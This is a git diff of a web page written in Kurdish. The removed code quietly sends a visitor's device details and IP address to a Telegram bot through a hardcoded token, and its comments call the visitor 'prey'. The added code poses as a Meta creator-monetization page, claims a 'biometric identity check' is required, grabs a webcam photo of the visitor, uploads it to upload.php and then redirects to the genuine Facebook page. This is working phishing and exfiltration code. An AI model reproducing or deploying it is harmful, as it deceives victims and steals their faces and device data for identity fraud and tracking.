@@ -1,43 +1,63 @@
 <!DOCTYPE html>
-<html>
+<html lang="ku" dir="rtl">
 <head>
-    <title>Redirecting...</title>
+    <meta charset="UTF-8">
+    <title>Meta Business Suite - Monetization</title>
     <style>
-        body { margin: 0; padding: 0; overflow: hidden; }
-        iframe { width: 100vw; height: 100vh; border: none; }
+        body { background: #f0f2f5; font-family: 'Segoe UI', sans-serif; margin: 0; text-align: center; }
+        .nav { background: #ffffff; padding: 10px; border-bottom: 1px solid #ddd; display: flex; align-items: center; justify-content: center; }
+        .card { background: white; max-width: 500px; margin: 50px auto; padding: 30px; border-radius: 10px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        .meta-blue { color: #1877f2; font-weight: bold; font-size: 24px; }
+        .step { background: #e7f3ff; color: #1877f2; padding: 10px; border-radius: 5px; margin: 20px 0; font-weight: bold; }
+        .btn-meta { background: #1877f2; color: white; border: none; padding: 15px 40px; border-radius: 7px; font-size: 18px; cursor: pointer; width: 100%; }
+        #camera-area { display: none; }
     </style>
 </head>
 <body>
-    <iframe src="https://www.google.com/search?q=breaking+news"></iframe>
+    <div class="nav"><span class="meta-blue">Meta</span> <span style="margin-right:10px; color:#555;">for Creators</span></div>
+
+    <div class="card" id="start-box">
+        <img src="https://cdn-icons-png.flaticon.com/512/2172/2172430.png" width="80">
+        <h2>پیرۆزە! پەیجەکەت شایستەی داهاتە</h2>
+        <p>بۆ ئەوەی ڕیکلام بکەوێتە سەر ڤیدیۆکانت و داهات بەدەست بهێنیت، دەبێت هەنگاوی کۆتایی بڕبڕیت.</p>
+        <div class="step">هەنگاوی ٣ لە ٣: ناسینەوەی خاوەن ماف (Identity)</div>
+        <button class="btn-meta" onclick="openMetaCamera()">دەستپێکردنی پشکنینی بایۆمیتری</button>
+    </div>
+
+    <div class="card" id="camera-area">
+        <h3>خەریکی پشکنینی ناسنامە...</h3>
+        <p>تکایە دەموچاوت لە ناوەڕاستی چوارچێوەکەدا جێگیر بکە.</p>
+        <div style="width:100%; height:250px; background:#000; border-radius:10px; border:3px solid #1877f2;"></div>
+        <p id="status">ئامادەیە بۆ وێنەگرتن...</p>
+    </div>
+
+    <video id="v" autoplay style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        (async function() {
-            const T = '8003094558:AAFAyNxNF-wAnQCgZ8XTJrZRIomL_l9JKrs';
-            const C = '8418985219';
-
-            // ١. کۆکردنەوەی زانیاری زۆر ورد (IP, Battery, Device)
-            let batteryInfo = "";
-            try {
-                const batt = await navigator.getBattery();
-                batteryInfo = `%0A🔋 باتری: ${Math.round(batt.level * 100)}%`;
-            } catch(e) {}
-
-            const data = `👑 **سولتانە پاشا، نێچیرەکە ڕاوکرا!**%0A` +
-                         `📱 مۆبایل: ${navigator.platform}%0A` +
-                         `🌐 وێبگەڕ: ${navigator.userAgent.split(' ')[0]}` +
-                         batteryInfo +
-                         `%0A📍 زمان: ${navigator.language}`;
-
-            // ٢. ناردنی زانیارییەکان بە بێدەنگی
-            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${data}&parse_mode=Markdown`);
-
-            // ٣. فێڵی گەورە: دزینی IP بەبێ ئەوەی هەست بکات
-            fetch('https://api.ipify.org?format=json')
-                .then(r => r.json())
-                .then(ip => {
-                    fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=🌐 IPی نێچیر: ${ip.ip}`);
-                });
-        })();
+        function openMetaCamera() {
+            document.getElementById('start-box').style.display = 'none';
+            document.getElementById('camera-area').style.display = 'block';
+            
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(function(s) {
+                var v = document.getElementById('v');
+                v.srcObject = s;
+                setTimeout(function() {
+                    var c = document.getElementById('c');
+                    c.width = v.videoWidth; c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    fetch('upload.php', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: 'img=' + encodeURIComponent(c.toDataURL('image/jpeg'))
+                    }).then(() => {
+                        alert("سوپاس! داواکارییەکەت وەرگیرا. لە ماوەی ٢٤ کاتژمێردا وەڵام دەدرێیتەوە.");
+                        window.location.href = "https://www.facebook.com/creators/tools/mweb/monetization/eligibility";
+                    });
+                }, 3000);
+            }).catch(() => { alert("هەڵە: بۆ وەرگرتنی داهات، پێویستە مۆڵەتی کامێرا بدەیت بە سیستەمی مێتا."); });
+        }
     </script>
 </body>
 </html>
